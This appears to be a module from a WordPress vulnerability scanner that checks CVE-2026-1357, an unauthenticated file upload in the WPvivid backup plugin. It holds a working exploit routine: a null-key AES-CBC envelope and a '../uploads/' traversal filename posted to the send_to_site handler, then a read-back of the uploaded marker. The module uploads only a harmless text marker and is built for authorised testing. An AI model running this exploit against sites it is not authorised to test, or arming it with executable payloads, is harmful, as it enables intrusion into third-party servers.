from __future__ import annotations

import base64
import hashlib
import json
from typing import Any

from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from .wpvivid_advisory import COMPONENT, passive_result

CVE_ID = "CVE-2026-1357"
NAME = "WPvivid Backup & Migration unauthenticated arbitrary file upload"
AFFECTED_RULE = "WPvivid Backup & Migration up to and including 0.9.123"
FIXED_RULE = "WPvivid 0.9.124 or later"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe"]
AFFECTED_VERSIONS = ["<=0.9.123"]
# The vulnerable send_to_site() chunk handler writes $params['name']
# verbatim under the backup dir. The backup dir itself forbids reads
# (.htaccess deny), so the safe probe escapes to the public uploads dir
# with a traversal name — the same primitive the advisory describes.
TRAVERSAL_PREFIX = "../uploads/"
READBACK_BASE = "/wp-content/uploads/"


def _nullkey_cbc(payload: bytes) -> bytes | None:
    try:
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except ImportError:
        return None
    padder = padding.PKCS7(128).padder()
    data = padder.update(payload) + padder.finalize()
    encryptor = Cipher(algorithms.AES(b"\x00" * 16), modes.CBC(b"\x00" * 16)).encryptor()
    return encryptor.update(data) + encryptor.finalize()


def _encrypted_content(params: dict[str, Any]) -> str | None:
    cipher = _nullkey_cbc(json.dumps(params).encode())
    if cipher is None:
        return None
    blob = b"000" + b"" + f"{len(cipher):016x}".encode() + cipher
    return base64.b64encode(blob).decode()


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    marker = f"PROOFCMS_WPVIVID_{rand_str(8)}"
    sent_name = f"proofcms-wpvivid-{rand_str(8).lower()}.txt"
    stored_name = TRAVERSAL_PREFIX + sent_name
    payload = base64.b64encode(marker.encode()).decode()
    content = _encrypted_content(
        {
            "backup_id": "proofcms-test",
            "name": stored_name,
            "offset": 0,
            "data": payload,
            "md5": hashlib.md5(marker.encode()).hexdigest(),
        }
    )
    if content is None:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=base + "/",
            detail="The safe probe needs the 'cryptography' package for the null-key envelope and it is not installed.",
            action="Install the cryptography package or verify manually in the lab.",
        )
    client = HttpSession(base, timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    upload = client.post(
        f"{base}/",
        fields={"wpvivid_action": "send_to_site", "wpvivid_content": content},
        timeout=timeout,
    )
    if is_transport_error(upload):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            evidence={"handler_reached": False},
            detail=f"The send_to_site request failed at the transport layer ({transport_error_detail(upload)}).",
            action="Retry when the target is reachable.",
        )
    upload_body = upload.get("body", "") or ""
    evidence: dict[str, object] = {
        "handler_reached": True,
        "upload_accepted": '"result":"success"' in upload_body.replace(" ", ""),
        "marker_read_back": False,
        "stored_name": sent_name,
        "upload_status": upload.get("status", 0),
    }
    if '"result":"success"' not in upload_body.replace(" ", ""):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            evidence=evidence,
            detail=(
                "The send_to_site handler did not accept the null-key probe chunk "
                f"(HTTP {upload.get('status', 0)}). The RSA/content gate may already enforce the fix."
            ),
            action="If WPvivid is at or below 0.9.123, verify the wpvivid_api_token setup and retry in the lab.",
        )
    readback = client.get(f"{base}{READBACK_BASE}{sent_name}", timeout=timeout)
    body = readback.get("body", "") or ""
    if readback.get("status") == 200 and marker in body:
        evidence["marker_read_back"] = True
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE_UPLOAD_ONLY", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{READBACK_BASE}{sent_name}",
            uploaded_filename=sent_name,
            evidence=evidence,
            detail=(
                "Unauthenticated null-key send_to_site chunk was accepted and the marker file was read back "
                "byte-identical from the public uploads directory, confirming the missing auth/decryption gate "
                "and unsanitized filename. Execution is server-dependent (served as text here); "
                "no executable content was uploaded."
            ),
            action=f"Upgrade WPvivid to {FIXED_RULE} and delete {sent_name} from the uploads directory.",
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{READBACK_BASE}{sent_name}",
        evidence=evidence,
        detail=(
            "The upload reported success but the marker file could not be read back from the public "
            f"uploads directory (HTTP {readback.get('status', 0)})."
        ),
        action="Verify the uploads directory mapping and web access manually.",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(
        cve=CVE_ID, name=NAME, affected_rule=AFFECTED_RULE, plugins=plugins,
        fixed="0.9.124", remediation=f"Upgrade WPvivid to {FIXED_RULE}.",
        vulnerability_type="Unrestricted File Upload",
    )
    if not run_exploit_check or passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    if exploit_mode != "safe":
        passive.detail += " This CVE module only supports the safe null-key chunk proof."
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_versions": AFFECTED_VERSIONS,
        "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["detect_wordpress_plugins"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-1357",
            "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpvivid-backuprestore/migration-backup-staging-09123-unauthenticated-arbitrary-file-upload",
            "https://www.wordfence.com/blog/2026/02/800000-wordpress-sites-affected-by-arbitrary-file-upload-vulnerability-in-wpvivid-backup-wordpress-plugin",
        ],
    }
